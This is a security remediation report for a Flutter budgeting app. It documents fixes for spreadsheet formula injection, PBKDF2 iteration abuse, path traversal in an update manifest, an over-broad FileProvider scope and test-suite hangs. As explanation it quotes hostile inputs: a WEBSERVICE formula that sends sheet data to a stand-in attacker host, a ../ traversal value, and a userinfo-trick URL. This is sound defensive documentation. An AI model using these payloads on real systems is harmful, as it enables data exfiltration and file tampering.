## F-001 — Spreadsheet formula injection in CSV/XLSX export

**Severity:** Medium · **Status:** Fixed

**Files changed**
- `lib/core/utils/spreadsheet_safety.dart` (new)
- `lib/domain/services/export_service.dart`

**Summary of fix**

`ExportSchema.row` wrote user-controlled text (transaction name, category name,
merchant, payment method, notes, tags) straight into CSV and XLSX cells. A value
beginning with `=`, `+`, `-`, `@`, or a leading tab/CR is parsed as a *formula*
by Excel, Numbers, LibreOffice and Google Sheets, so an entry such as
`=WEBSERVICE("http://attacker.example/?d="&A1)` executes when the export is
opened and can transmit the rest of the sheet.

Added a single `SpreadsheetSafety.cell` helper that prefixes an apostrophe,
which every mainstream spreadsheet interprets as "treat the remainder as
literal text". Applied it at `ExportSchema.row`, which is the one place both the
CSV and XLSX writers project a transaction into columns, so the escaping cannot
be applied inconsistently across formats.

Amount, date and time columns are deliberately left unescaped: they are
generated by BudgetSense rather than by the user, and the amount legitimately
begins with `-` when negative and must stay numeric for the spreadsheet to total
the column.

**Tests added**
- `test/security/spreadsheet_safety_test.dart` — every dangerous leading
  character is neutralised, benign text is untouched, mid-string `=` is ignored,
  the helper is idempotent.
- `test/security/export_injection_test.dart` — end-to-end through the real
  `FileExportService`, proving the escaping is actually wired into the export
  path rather than merely available.

**Validation:** `flutter test test/security/` and
`flutter test test/domain/export_schema_test.dart` pass.

**Remaining external action:** none.

## F-002 — Unbounded, attacker-controlled PBKDF2 iteration count

**Severity:** Medium · **Status:** Fixed

**Files changed**
- `lib/data/cloud/encryption_service.dart`
- `test/data/cloud/encryption_service_test.dart`
- `test/data/cloud/cloud_stores_test.dart`

**Summary of fix**

`_EncEnvelope.parse` read the PBKDF2 iteration count directly from the backup
file so that older backups remain readable. That makes it attacker-controlled
input: a crafted `.bsbak` declaring two billion iterations sends the restore
path into an effectively unbounded key derivation before the user can cancel
(CWE-1284 / CWE-400). A very low count is the mirror problem, making a wrapped
key cheap to brute force.

Added `minAcceptedIterations` (100,000) and `maxAcceptedIterations` (1,000,000)
and enforced them on parse. The same bounds are enforced on the *write* path via
`_requireIterations`, so the app cannot produce an envelope it would later
refuse to open, which would surface to the user as silent backup corruption
discovered only at restore time.

The same parser also cast envelope fields unchecked (`m[k]! as String`), so a
malformed or truncated file escaped as a raw `CastError`/`FormatException`
instead of the typed `CloudFailure` the restore flow handles. All field reads
now validate type and base64 and fail as `CloudFailure`.

Two pre-existing tests used `iterations: 1000` for speed and correctly began
failing against the new floor. They were updated to the real floor rather than
lowering the control; the full encryption suite still runs in a few seconds.

**Tests added**
- `test/security/encrypted_envelope_hardening_test.dart` — rejects excessive,
  downgraded, missing and non-numeric iteration counts; malformed, non-string
  and invalid-base64 fields fail as `CloudFailure`; foreign files are rejected;
  a genuine backup still round-trips and a wrong passphrase is still refused.

Note: the non-numeric case caught a genuine gap in the first version of this
fix, where `as num?` still threw a raw cast error. Corrected.

**Validation:** `flutter test test/security/ test/data/cloud/` passes (all green).

**Remaining external action:** none.

## F-003 — Path injection via update manifest `versionName`

**Severity:** Medium · **Status:** Fixed

**Files changed**
- `lib/data/updates/update_manifest.dart`

**Summary of fix**

`UpdateService` builds the download path as
`'$dir/BudgetSense-${manifest.versionName}.apk'` from a remotely fetched
manifest. `versionName` had no validation, so a value like
`../../databases/app` would place the downloaded file outside the intended
directory (CWE-22), and that file is subsequently handed to the package
installer.

`versionName` is now restricted to 1-64 characters of `[A-Za-z0-9._+-]` with an
explicit `..` rejection, which covers every realistic version string while
excluding path separators and traversal.

Additionally, `apkUrl` was validated with `startsWith('https://')`, which accepts
`https://` with no host and the userinfo trick
`https://github.com@evil.example/app.apk`. It is now parsed with `Uri.tryParse`
and checked for scheme, non-empty host and absent userinfo.

**Tests added**
- `test/security/update_manifest_validation_test.dart` — traversal and separator
  payloads rejected, over-long names rejected, realistic versions accepted,
  non-https/malformed/userinfo URLs rejected, digest and versionCode validation
  pinned.

**Validation:** `flutter test test/security/` passes.

**Remaining external action:** none. Note this path is dormant unless
`UPDATE_REPO_SLUG` is supplied at build time.

## F-004 — Over-broad FileProvider exposed the transaction database

**Severity:** Medium · **Status:** Fixed

**Files changed**
- `android/app/src/main/res/xml/provider_paths.xml`

**Summary of fix**

The FileProvider declared `cache-path`, `files-path` and `external-cache-path`,
all with `path="."`. `files-path` with `path="."` covers the entire app files
directory, which is where the Drift/SQLite database holding every transaction
lives. A FileProvider path is a standing capability rather than a one-off grant,
so this made the full financial database eligible to be handed out as a
`content://` URI.

The only consumer of this provider is the update installer, which downloads to
`getTemporaryDirectory()` (the cache directory). Verified by grep that no other
code calls `FileProvider.getUriForFile` with this authority; `share_plus` uses
its own separate provider. The declaration is now `cache-path` only.

**Verification in the built binary:** decoded `res/xml/provider_paths` from the
release APK with `aapt2 dump xmltree`; it contains a single `cache-path` element
and nothing else.

**Tests added:** covered by `scripts/security_gate.sh` check 4, which fails if
`files-path`, `external-path` or `root-path` reappears. Fail-behaviour verified
by temporarily reintroducing `files-path` and confirming the gate failed.

**Remaining external action:** none.

## F-005 — Installer platform channel accepted an arbitrary path

**Severity:** Medium · **Status:** Fixed

**Files changed**
- `android/app/src/main/kotlin/com/budgetsense/budgetsense/MainActivity.kt`

**Summary of fix**

The `installApk(path)` method channel handler passed any supplied path to
`FileProvider.getUriForFile` and then to the package installer, checking only
`file.exists()`. A MethodChannel is an IPC boundary and its input should be
treated as untrusted regardless of which Dart code is expected to call it.

The handler now resolves the canonical path (collapsing `..` segments and
symlinks) and requires it to sit inside the app cache directory before
proceeding, which matches the newly narrowed FileProvider scope. Rejections are
logged without echoing the path.

This is defence in depth: the Dart caller already builds the path itself and the
OS installer still requires explicit user confirmation and a signature match.

**Tests added:** none directly. This is Kotlin code with no instrumentation
harness in this repository, and the guard depends on real `Context.cacheDir`
resolution. Covered indirectly by the release build succeeding and by manual
review; on-device verification is listed as residual risk.

**Validation:** `flutter build apk --release` succeeds (exit 0).

**Remaining external action:** on-device verification of the update install
flow.

## Not changed, and why

**Plaintext local backups in shared storage (F-006, Low, accepted).**
`backup_screen.dart` writes an unencrypted snapshot to a top-level
`BudgetSense_Backup` folder, readable by any app holding storage permission and
surviving uninstall. This is a deliberate product decision: the feature exists so
users own a portable, restorable copy, and it is disclosed in `PRIVACY.md`.
Encrypting it would require a passphrase the local-backup flow does not have.
Recorded as an accepted risk rather than silently changed, since altering it
would break the documented feature.

**R8 / minification disabled (Informational, accepted).**
`isMinifyEnabled = false` is an intentional project choice. Obfuscation is
reverse-engineering friction, not a security control, and this app embeds no
secrets that obfuscation would need to protect.

**Outdated dependencies (Low, deferred).**
Many packages are one or more majors behind and `sqlite3_flutter_libs` is
flagged EOL. No specific reachable advisory was identified, and no vulnerability
scanner (osv-scanner, gitleaks, trufflehog, semgrep) is installed on this host to
confirm one either way. Major-version upgrades across drift, riverpod,
file_picker and flutter_local_notifications carry real breaking-change risk and
should be a scheduled, separately tested piece of work rather than a change
bundled into a security patch. CI already runs OSV-Scanner as a blocking gate,
so a known advisory would surface there.

## F-011, F-012, F-013 — 2026-08-16 addendum

### F-011: App-owned APK installer and self-update path

**Severity:** High · **Status:** Fixed

Removed the custom update client, APK download/install channel, installer UI,
manifest `REQUEST_INSTALL_PACKAGES` permission, and app-owned FileProvider.
The About screen now links only to the Google Play listing. This removes the
remote-manifest, arbitrary installer-path, and sideload trust boundary from the
application.

**Validation:** `flutter analyze` passed after removal. Source search found no
remaining updater implementation references. Android installer tests were
removed with the feature rather than retained as dead coverage.

### F-012: Financial database at rest is plaintext

**Severity:** Medium · **Status:** Open, release-blocking

A real SQLCipher release-APK probe succeeded on the API 36 emulator, including
wrong-key failure and ciphertext header/canary checks. The required maintained
Dart stack uses `sqlite3` 3.x plus a SQLCipher hook. Its compatible Drift
upgrade requires generated source regeneration. The supplied Flutter host lacks
the compatible host `gen_snapshot`, so `build_runner` cannot regenerate the
Drift file. No hand edit to generated database code was accepted. The partial
migration was rolled back; the current shipping connection remains plaintext.

**Required action:** Repair or use the repository-pinned Flutter SDK on a host
with compatible code-generation artifacts, upgrade/regenerate Drift, then
reapply and validate SQLCipher migration before release.

### F-013: Local signing material and future public-tree policy

**Severity:** High before external credential rotation · **Status:** Conditional
external action

Three private release-material files were copied with SHA-256 equality checks to
a user-private directory outside this checkout, permissions `0600`, then the
working-tree originals were removed. Gradle now accepts signing configuration
only from `BUDGETSENSE_KEYSTORE_PROPERTIES` outside the checkout and rejects a
keystore path inside the repository. `.gitignore`, a no-Git policy validator,
and a mandatory post-`git init` verifier were added.

**Required action:** rotate any signing/upload credentials that ever existed in
a shareable location, create Git history only after the verifier passes, and
replace mutable GitHub Action tags with reviewed full-SHA pins.

### F-010: Widget-test suite hang (root-caused and fixed)

**Severity:** Informational (test-integrity gate, not a shipped vulnerability) ·
**Status:** Fixed

**Files changed:**

- `test/support/test_database.dart` (added `closeTestDatabase`)
- `test/features/settings/threshold_editor_screen_test.dart`
- `test/features/settings/custom_field_manager_screen_test.dart`

**Root cause.** Earlier passes blamed repeating animations (`ShimmerBlock`, then
`CircularProgressIndicator`). Both were wrong. Step-by-step instrumentation
showed every assertion completing and the hang starting only after
`db.close()` was called.

Cancelling a Drift query stream posts a **zero-duration timer**
(`QueryStream._onCancelOrPause` -> `StreamQueryStore.markAsClosed`).
`AppDatabase.close()` awaits it. Under `testWidgets` the fake clock advances
only while something pumps it, and `addTearDown(db.close)` runs after the last
pump. The close therefore awaited a timer that could never fire: an unbounded
hang rather than a failure. `--timeout` never fired because that budget is
measured on the same fake clock.

**Fix.** `closeTestDatabase(tester, db)` pumps once to drain the cancellation
timer, then closes. The two affected files call it from their existing
`_unmountScreen` helper instead of `addTearDown(db.close)`, keeping the
teardown in one place per file rather than repeated in every test.

**Validation:**

- `flutter test test/features/settings/threshold_editor_screen_test.dart`: 8/8
  pass in ~2s (previously hung indefinitely).
- `flutter test test/features/settings/custom_field_manager_screen_test.dart`:
  5/5 pass in ~2s (previously hung indefinitely).
- `flutter analyze`: no issues.

**Note for future runs.** On the assessment host, `flutter test` prints its
summary and then never exits, for a trivial `1 + 1` test as well. That is a
local toolchain defect, unrelated to this repository. Do not read a
non-returning `flutter test` as a test hang without first checking whether the
summary line was already printed.

## F-010 follow-up: full test suite now green (2026-08-16)

The Drift teardown hang is fully resolved and the entire suite runs to
completion for the first time.

**Root cause (complete).** Two conditions must both hold or a widget test
hangs forever, with no failure and no timeout (`--timeout` runs on the same
fake clock, so it can never fire):

1. The widget watching the Drift stream must be *unmounted*. Unmounting is
   what cancels the subscription. Pumping alone does not.
2. A pump must happen *after* cancellation, because cancelling a Drift query
   stream posts a zero-duration timer in `StreamQueryStore.markAsClosed`, and
   `db.close()` awaits it. Under `testWidgets` the fake clock only advances
   while something pumps.

Closing with the widget still mounted waits on a live subscription. Cancelling
without a further pump waits on a timer nothing will run.

**Fix.** `test/support/test_database.dart` gained two helpers:
`closeTestDatabase(tester, db)` (pump, then close) and
`closeTestDatabaseOnTearDown(tester, db)`. Files where the screen is torn down
normally use the teardown form; `backup_screen_test.dart` keeps its screen
mounted to the last assertion, so those tests unmount in-body and then close.
A database that no widget ever watched just closes inline.

**Validation.** `flutter test --concurrency=1` reports **516 tests, "All tests
passed!"**. `flutter analyze` reports no issues. `dart format` is clean.

**Two real test defects were unmasked and fixed** in
`category_manager_screen_test.dart`, both previously hidden by the hang:

- *deleting a category in use*: asserted `find.text('Food')` matched nothing
  anywhere, but the list behind the dialog legitimately still shows it. The
  assertion is now scoped to the `SimpleDialog`. The app code was already
  correct, excluding the deleted category by id.
- *dragging a category to the top*: a single `moveTo` landed one slot short,
  because `ReorderableListView` recalculates the drop slot as the pointer
  moves. The drag is now walked in steps with pumps between them.

**Host caveat.** `flutter test` completes but the process does not exit on this
machine, and a parallel full-suite run is killed part way under load. The
`--concurrency=1` run is the one that produced the clean result above.
